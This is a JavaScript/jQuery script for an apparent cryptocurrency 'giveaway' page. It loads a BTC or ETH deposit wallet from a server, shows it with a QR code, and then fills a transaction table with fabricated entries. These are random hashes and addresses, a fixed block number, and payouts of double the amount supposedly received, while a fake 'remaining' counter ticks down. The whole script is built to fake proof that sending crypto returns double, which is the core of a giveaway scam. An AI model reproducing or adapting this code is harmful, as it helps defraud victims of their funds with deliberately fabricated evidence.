$(document).ready(function() {

  var max = $('.progress-ico').width();
  var max_btc = 5000;
  var start_btc = 4760;

  var max_eth = 100000;
  var start_eth= 87459;

  var spd_btc = 1;
  var spd_eth = 2;


  function ReplaceNumberWithCommas(yourNumber) {
      //Seperates the components of the number
      var n= yourNumber.toString().split(".");
      //Comma-fies the first part
      n[0] = n[0].replace(/\B(?=(\d{3})+(?!\d))/g, " ");
      //Combines the two sections
      return n.join(".");
  }

  function randomNumberFromRange(min,max)
  {
      return Math.floor(Math.random()*(max-min+1)+min);
  }

  var cosh_type;

  $('.show_form_btc').click(function(){
    cosh_type = 'BTC';
  })

  $('.show_form_eth').click(function(){
    cosh_type = 'ETH';
  })


  function makeid(length) {
   var result           = '';
   var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   var charactersLength = characters.length;
   for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}

  function makeid2(length) {
   var result           = '';
   var characters       = 'ABCDEFabcdef0123456789';
   var charactersLength = characters.length;
   for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}



  $('.show_form').click(function(){
      $('.btns_block').hide();
      var max_i;
      var spd;
      var cosh_prefix;
      if(cosh_type=='BTC')
	  {
        cosh_prefix = '3';

        if(localStorage.getItem('kol_btc')){
            start_btc = localStorage.getItem('kol_btc');
        }

        $('.type_wallet').text('BTC');
        $('.max_vl').text(ReplaceNumberWithCommas(max_btc));
        $('.ostat').text(ReplaceNumberWithCommas(start_btc));
        max_i = max_btc;
        spd = spd_btc;
        $('.tabl_btc').show();
      }
	  else
	  {
        cosh_prefix = '0x';

        if(localStorage.getItem('kol_eth')){
            start_eth = localStorage.getItem('kol_eth');
        }

        $('.type_wallet').text('ETH');
        $('.max_vl').text(ReplaceNumberWithCommas(max_eth));
        $('.ostat').text(ReplaceNumberWithCommas(start_eth));
        max_i = max_eth;
        spd = spd_eth;
        $('.tabl_eth').show();
      }




      $.ajax({
        url: "get_wallet.php",
        type: "POST",
        data: {
          cosh_type: cosh_type
        },
        dataType: "html",
        success: function(data){
            data = JSON.parse(data);
            $('.cosh1').text(data['wallet']);
            $('.copy').attr('data-clipboard-text',data['wallet']);
            $('.qr_code').attr('src','https://chart.apis.google.com/chart?cht=qr&chs=230x230&chld=L&choe=UTF-8&chl='+data['wallet']);

            $('.btn_wrapper').hide();
            $('.giveaway').show();


      $('html, body').animate({
        scrollTop: $("#giv_block").offset().top - 50
     }, 1000);


             var my_address = data['wallet'];

              // First 3
              for (var i = 0; i < 3; i++) {

                 if(cosh_type=='BTC'){
                  var generated_address = cosh_prefix + makeid(13);
                }else{
                  var generated_address = cosh_prefix + makeid2(13);
                }
                 
                 var tx_1 = makeid(22);
                 var tx_2 = makeid(22);
                 var address = my_address.slice(0,13)+'...';
                 var rnd = randomNumberFromRange(2, 20);

                 var summ_hvos = randomNumberFromRange(11, 99);
     
                 var summ_out = rnd*spd + "." + summ_hvos;
                 var summ_in = (summ_out/2).toFixed() + "." + (summ_hvos/2).toFixed();
                  $('.trans-table').prepend('<div class="inner"> <div class="top" style="display: none;"> <div class="row row-trans-out"> <div class="hash col-lg-3 col-md-3 col-sm-3 col-xs-3" style="text-align:left;">'+tx_1+'...</div> <div class="block-num col-lg-1 col-md-1 col-sm-1 col-xs-1">616135</div> <div class="age col-lg-1 col-md-1 col-sm-1 col-xs-1">right now</div> <div class="address-btc-sec col-lg-2 col-md-2 col-sm-2 col-xs-2">'+address+'</div> <div class="out-trans col-lg-1 col-md-1 col-sm-2 col-xs-2">OUT</div> <div class="address-btc col-lg-2 col-md-2 col-sm-2 col-xs-2">'+ generated_address +'...</div> <div class="value-sum col-lg-1 col-md-1 col-sm-1 col-xs-1">'+summ_out+" "+cosh_type+'</div> <div class="tx-fee col-lg-1 col-md-1 col-sm-1 col-xs-1">0.00'+randomNumberFromRange(100,999)+'</div> </div> </div> <div class="bottom" > <div class="row row-trans-in"> <div class="hash col-lg-3 col-md-3 col-sm-3 col-xs-3" style="text-align:left;">'+tx_2+'...</div> <div class="block-num col-lg-1 col-md-1 col-sm-1 col-xs-1">616135</div> <div class="age col-lg-1 col-md-1 col-sm-1 col-xs-1">right now</div> <div class="address-btc col-lg-2 col-md-2 col-sm-2 col-xs-2">'+ generated_address +'...</div> <div class="in-trans col-lg-1 col-md-1 col-sm-1 col-xs-1">IN</div> <div class="address-btc-sec col-lg-2 col-md-2 col-sm-2 col-xs-2">'+address+'</div> <div class="value-sum col-lg-1 col-md-1 col-sm-1 col-xs-1">'+summ_in+" "+cosh_type+'</div> <div class="tx-fee col-lg-1 col-md-1 col-sm-2 col-xs-2">0.00'+randomNumberFromRange(100,999)+'</div> </div> </div> </div>');
                  $('.trans-table .top').show();
              }

              var one_min_timer = 0;

              // Next
              setInterval(function(){

                // Minutes timer
                one_min_timer++;
                if(one_min_timer==3){
                  one_min_timer=0;
                  $('.trans-table .age').each(function(){
                    var this_age = $(this).text();
                    if(this_age=='right now'){
                      $(this).text('1 minu...');
                    }else{
                      this_age=this_age.split(" ");
                      this_age=parseInt(this_age[0])+1;
                      $(this).text(this_age+' minu...');
                    }
                  })
                }

                 var current = parseInt($('.ostat').text().replace(/ /g, ''));
                 var current_width = $('#progress-ico').width();
                 var rnd = randomNumberFromRange(2, 20);

                 var summ_hvos = randomNumberFromRange(11, 99);

                 var summ_out = rnd*spd + "." + summ_hvos;
                 var summ_in = (summ_out/2).toFixed() + "." + (summ_hvos/2).toFixed();

                 var new2 = parseInt(current-summ_out);


                if(new2>0){

                  if(cosh_type=='BTC'){
                     localStorage.setItem('kol_btc', new2);
                  }else{
                     localStorage.setItem('kol_eth', new2);
                  }



                  new2 = ReplaceNumberWithCommas(new2);
                  var new_w = (max*current)/max_i;
                  $('#progress-ico').css('width',new_w);
                  $('.ostat').text(new2);

                  var generated_address = cosh_prefix + makeid(13);
                  var tx_1 = makeid(22);
                  var tx_2 = makeid(22);
                  var address = my_address.slice(0,13)+'...';

                  //IN 
                  $('.trans-table').prepend('<div class="inner"> <div class="top" style="display: none;"> <div class="row row-trans-out"> <div class="hash col-lg-3 col-md-3 col-sm-3 col-xs-3" style="text-align:left;">'+tx_1+'...</div> <div class="block-num col-lg-1 col-md-1 col-sm-1 col-xs-1">616135</div> <div class="age col-lg-1 col-md-1 col-sm-1 col-xs-1">right now</div> <div class="address-btc-sec col-lg-2 col-md-2 col-sm-2 col-xs-2">'+address+'</div> <div class="out-trans col-lg-1 col-md-1 col-sm-2 col-xs-2">OUT</div> <div class="address-btc col-lg-2 col-md-2 col-sm-2 col-xs-2">'+ generated_address +'...</div> <div class="value-sum col-lg-1 col-md-1 col-sm-1 col-xs-1">'+summ_out+" "+cosh_type+'</div> <div class="tx-fee col-lg-1 col-md-1 col-sm-1 col-xs-1">0.00'+randomNumberFromRange(100,999)+'</div> </div> </div> <div class="bottom" > <div class="row row-trans-in"> <div class="hash col-lg-3 col-md-3 col-sm-3 col-xs-3" style="text-align:left;">'+tx_2+'...</div> <div class="block-num col-lg-1 col-md-1 col-sm-1 col-xs-1">616135</div> <div class="age col-lg-1 col-md-1 col-sm-1 col-xs-1">right now</div> <div class="address-btc col-lg-2 col-md-2 col-sm-2 col-xs-2">'+ generated_address +'...</div> <div class="in-trans col-lg-1 col-md-1 col-sm-1 col-xs-1">IN</div> <div class="address-btc-sec col-lg-2 col-md-2 col-sm-2 col-xs-2">'+address+'</div> <div class="value-sum col-lg-1 col-md-1 col-sm-1 col-xs-1">'+summ_in+" "+cosh_type+'</div> <div class="tx-fee col-lg-1 col-md-1 col-sm-2 col-xs-2">0.00'+randomNumberFromRange(100,999)+'</div> </div> </div> </div>');

                  //OUT
                  setTimeout(function(){
                    $('.trans-table .top').show();
                  },1000)

                }

              },15000);



        }
       });

    });


});
